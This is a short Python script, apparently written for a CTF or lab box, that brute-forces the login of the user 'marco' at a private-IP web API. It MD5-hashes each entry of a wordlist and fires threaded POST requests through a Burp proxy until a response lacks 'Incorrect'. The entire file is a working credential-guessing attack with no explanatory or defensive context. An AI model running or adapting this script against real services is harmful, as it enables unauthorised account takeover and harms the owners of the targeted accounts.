import hashlib
import requests
import signal
import threading
import sys
import pdb
import time
import json
 
from pwn import *
 
# Ctrl + C
def def_handler(sig, frame):
    print ("\n[!] Saliendo...\n")
    sys.exit(1)
 
signal.signal(signal.SIGINT, def_handler)
 
# Variables globales
main_url = "http://10.10.150.217/api/ogin.php"
burp = {'http': '127.0.0.1:8080'}
p1 = log.progress("Fuerza Bruta")
 
def makeRequest(hashed_password, password):
 
    login_data = {"username":"marco","password":hashed_password}
 
    s = requests.session()
    response = s.post(main_url, data=json.dumps(login_data), proxies=burp)
 
    if "Incorrect" not in response.text:
        p1.success("La password es %s" % password)
        sys.exit(0)

def createMD5():

    filename = "diccionario.txt"

    f = open(filename, "r")
    threads = list()

    top = 100
    counter = 0

    for password in f.readlines():
        hashed_password = hashlib.md5(password.strip('\n').encode('utf-8')).hexdigest()

        if counter != top:
            try:
                x = threading.Thread(target=makeRequest, args=(hashed_password, password.strip('\n'),))
                threads.append(x)
                x.start()
                counter += 1
            except Exception as e:
                log.error(str(e))
        else:
            p1.status("%s peticiones enviadas" % str(counter))
            time.sleep(2)
            top +=100

if __name__ == '__main__':
 
    createMD5()
